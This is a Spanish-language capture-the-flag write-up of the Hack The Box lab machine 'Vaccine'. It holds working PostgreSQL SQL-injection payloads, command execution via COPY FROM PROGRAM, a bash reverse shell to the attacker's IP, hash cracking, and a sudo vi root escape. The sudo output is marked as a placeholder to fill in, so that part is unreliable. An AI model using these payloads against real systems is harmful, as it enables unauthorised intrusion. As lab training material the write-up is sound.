- Máquina: Vaccine (Hack The Box)
- Sistema operativo: Linux (Ubuntu)
- Dificultad: Easy

> ftp, anonymous login, zip, MD5, johntheripper, postgreSQL, SQL injection, RCE
## Resumen del camino

El acceso inicial parte de un FTP con login anónimo que expone un `backup.zip` protegido por contraseña. Crackeamos el zip, dentro está el código del login de la web con un hash MD5 hardcodeado. Crackeamos ese MD5 y entramos al panel. El panel tiene un buscador vulnerable a inyección SQL sobre PostgreSQL. Como el usuario de la base de datos es superusuario (`postgres`), aprovechamos `COPY ... FROM PROGRAM` para conseguir ejecución de comandos y una reverse shell. Con eso obtenemos la flag de usuario. Para root, encontramos las credenciales de la base de datos reutilizadas en la configuración de la web y una entrada de `sudo` mal configurada que permite escapar a una shell de root.

## 1. Reconocimiento

Lanzamos un escaneo completo de puertos con detección de servicios y scripts por defecto:

```
sudo nmap -sC -sV -p- 10.129.95.174
```

Resultado:

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
| ftp-syst:
|   STAT:
| FTP server status:
|      Logged in as ftpuser
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: MegaCorp Login
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Tenemos tres puertos:

- 21 (FTP, vsftpd 3.0.3): login anónimo permitido y un fichero `backup.zip` accesible.
- 22 (SSH): por ahora solo una puerta, sin credenciales aún.
- 80 (HTTP, Apache): una web con un login "MegaCorp Login".

El detalle que marca el primer paso es el `backup.zip` colgando del FTP anónimo. La hipótesis inmediata es que ese backup contiene el código de la web del puerto 80.

## 2. Enumeración FTP

El script `ftp-anon` de nmap ya nos adelantó que el login anónimo está permitido. Conectamos:

```
ftp 10.129.95.174
```

Nos autenticamos con el usuario `anonymous` y contraseña vacía. Listamos y solo hay un fichero:

```
ftp> ls
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
```

Lo descargamos con `get`:

```
ftp> get backup.zip
```

Al intentar descomprimirlo comprobamos que está protegido por contraseña. Contiene `index.php` y `style.css`, lo que confirma que es el código fuente de la web.

## 3. Crackeo del backup.zip

Como el zip está cifrado, no adivinamos la contraseña: la crackeamos offline. Extraemos el hash del cifrado del zip con `zip2john`, que lee las cabeceras de cifrado y genera una representación que John the Ripper sabe atacar:

```
zip2john backup.zip > hash.txt
```

Lanzamos un ataque de diccionario con el wordlist rockyou:

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Salida:

```
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
741852963        (backup.zip)
1g 0:00:00:00 DONE (2026-09-14 16:31)
Session completed.
```

La contraseña del zip es `741852963`. Es un ataque offline: tenemos el hash en local y probamos millones de contraseñas por segundo sin tocar el servidor. Extraemos el contenido:

```
unzip backup.zip
```

Introducimos `741852963` cuando lo pide y obtenemos `index.php` y `style.css`.

## 4. Análisis del login y crackeo del MD5

Leyendo `index.php` encontramos la lógica del login:

```php
if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
      $_SESSION['login'] = "true";
      header("Location: dashboard.php");
    }
}
```

El código valida que el usuario sea `admin` y que el MD5 de la contraseña coincida con el hash `2cb42f8734ea607eefed3b70af13bbd3`, que está hardcodeado. No hay un fallo lógico que saltar; el problema real es que el hash de la contraseña está expuesto en un backup accesible por FTP anónimo.

MD5 es un algoritmo rápido y roto para almacenar contraseñas, así que si la contraseña es común, cae con tablas ya calculadas. Consultamos el hash en CrackStation (crackstation.net):

`2cb42f8734ea607eefed3b70af13bbd3` corresponde a la contraseña `qwerty789`.

![[Pasted image 20260914163753.png]]

Accedemos a la web con usuario `admin` y contraseña `qwerty789`:

![[Pasted image 20260914164150.png]]

Entramos al `dashboard.php`, que es un catálogo de coches (MegaCorp Car Catalogue) con un buscador.

## 5. Inyección SQL

El elemento interesante del dashboard no es la tabla, es el buscador. Un buscador que consulta una base de datos es el primer candidato a inyección SQL.

### Detección

Probamos a romper la consulta metiendo una comilla simple en el buscador:

```
'
```

La web devuelve un error que además revela la consulta interna:

```
ERROR: unterminated quoted string at or near "'"
LINE 1: Select * from cars where name ilike '%'%'
```

Este error nos da tres cosas:

1. La inyección existe: nuestra comilla ha llegado a la consulta y ha roto la sintaxis.
2. Vemos la consulta real: nuestro input va entre `'%` y `%'`.
3. Es PostgreSQL: el operador `ilike` (LIKE insensible a mayúsculas) es propio de PostgreSQL, y el formato del mensaje de error es característico de ese motor.

### Conteo de columnas

Para montar una inyección UNION necesitamos saber cuántas columnas devuelve la consulta original. Lo confirmamos con `ORDER BY`, subiendo el número hasta que dé error:

```
' ORDER BY 5-- -
```

`ORDER BY 5` funciona y `ORDER BY 6` da error, así que la consulta tiene 5 columnas. La tabla en pantalla muestra 4 (Name, Type, Fuel, Engine), pero por detrás la consulta selecciona 5. La comilla inicial cierra la cadena que la aplicación abre, y `-- -` comenta el resto de la consulta original para que no rompa nuestra sintaxis.

### UNION y columnas visibles

Montamos un UNION con valores como texto (PostgreSQL es estricto con los tipos y las columnas originales son de texto):

```
' UNION SELECT '1','2','3','4','5'-- -
```

![[Pasted image 20260914165419.png]]

En la fila inyectada aparecen los valores 2, 3, 4 y 5 en las columnas Name, Type, Fuel y Engine. La posición 1 no se muestra en pantalla. Es decir, las posiciones útiles para extraer datos son la 2, 3, 4 y 5.

### Extracción de información

Confirmamos la versión del motor colocando `version()` en una posición visible:

```
' UNION SELECT '1',version(),'3','4','5'-- -
```

![[Pasted image 20260914165346.png]]

```
PostgreSQL 11.7 (Ubuntu 11.7-0ubuntu0.19.10.1) on x86_64-pc-linux-gnu
```

Comprobamos con qué usuario de base de datos corremos:

```
' UNION SELECT '1',current_user,'3','4','5'-- -
```

Devuelve `postgres`, que es el superusuario de PostgreSQL. Esto es determinante: un superusuario puede leer ficheros del sistema y ejecutar comandos del sistema operativo, así que no nos limitamos a extraer datos de la web.

Confirmamos la lectura de ficheros con `pg_read_file`:

```
' UNION SELECT '1',pg_read_file('/etc/passwd'),'3','4','5'-- -
```

Sale el contenido de `/etc/passwd`. Entre los usuarios reales con shell encontramos `simon` (UID 1000), `postgres` y `ftpuser`. La lectura de ficheros funciona, pero los directorios home de otros usuarios no son legibles como `postgres`, así que necesitamos ejecución de comandos real.

## 6. RCE vía PostgreSQL (COPY FROM PROGRAM)

Como somos superusuario, usamos `COPY ... FROM PROGRAM`, que ejecuta un comando del sistema y guarda su salida en una tabla. No es un `SELECT`, así que necesitamos apilar sentencias (stacked queries) separadas por `;`.

Primero confirmamos que las stacked queries funcionan y que ejecutamos comandos:

```
'; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; -- -
```

La inyección no devuelve error. Leemos la tabla con un UNION normal para ver la salida:

```
' UNION SELECT '1',cmd_output,'3','4','5' FROM cmd_exec-- -
```

Resultado:

```
uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)
```

Esto confirma ejecución de comandos como el usuario `postgres`.

## 7. Reverse shell y flag de usuario

Ejecutar comandos de uno en uno leyendo tablas es lento, así que montamos una reverse shell para tener una terminal interactiva.

En Kali levantamos un listener:

```
nc -lvnp 4444
```

Averiguamos nuestra IP de la VPN (interfaz `tun0`):

```
ip addr show tun0
```

En este caso `10.10.15.175`. Inyectamos el payload usando el mismo `COPY FROM PROGRAM`:

```
'; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'bash -c ''bash -i >& /dev/tcp/10.10.15.175/4444 0>&1'''; -- -
```

Detalles del payload:

- `DROP TABLE IF EXISTS cmd_exec` evita el error de que la tabla ya existe del intento anterior.
- El comando es una reverse shell de bash: `bash -i` abre una shell interactiva y `>& /dev/tcp/10.10.15.175/4444 0>&1` la conecta a nuestro listener.
- Las comillas simples internas se escapan duplicándolas (`''`), que es como PostgreSQL escapa una comilla dentro de una cadena.

En el listener recibimos la conexión:

```
connect to [10.10.15.175] from (UNKNOWN) [10.129.95.174]
postgres@vaccine:/var/lib/postgresql/11/main$
```

Estabilizamos la shell para trabajar mejor:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Buscamos la flag de usuario. Está en el home de postgres, no en el de simon:

```
postgres@vaccine:/var/lib/postgresql$ cat user.txt
ec9b13ca4d6229cd5cc1e09980965bf7
```

Flag de usuario: `ec9b13ca4d6229cd5cc1e09980965bf7`

## 8. Escalada de privilegios a root

### Credenciales reutilizadas

El servicio web necesita las credenciales de conexión a PostgreSQL guardadas en su configuración. Las buscamos en el código de la web:

```
cat /var/www/html/dashboard.php
```

En la línea de conexión a la base de datos aparece la contraseña de PostgreSQL: `qwerty789` (la misma que ya vimos para el login de la web, un caso de reutilización de credenciales).

### sudo -l

Con esa contraseña comprobamos qué puede ejecutar `postgres` como root vía sudo. Conviene estabilizar bien la shell antes, porque `sudo` exige una TTY real:

```
sudo -l
```

La salida muestra una entrada de sudo que permite a `postgres` ejecutar un programa concreto como root (rellenar con la salida real):

```
User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

### Escape a shell de root

El programa autorizado por sudo es `vi` (sobre un fichero de configuración de PostgreSQL). `vi` permite lanzar una shell desde su interior, y al ejecutarse como root vía sudo, esa shell es de root. Esta técnica está documentada en GTFOBins.

Ejecutamos:

```
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Dentro de vi, escapamos a una shell:

```
:set shell=/bin/bash
:shell
```

Con esto obtenemos una shell como root y leemos la flag:

```
cat /root/root.txt
```

Flag de root: 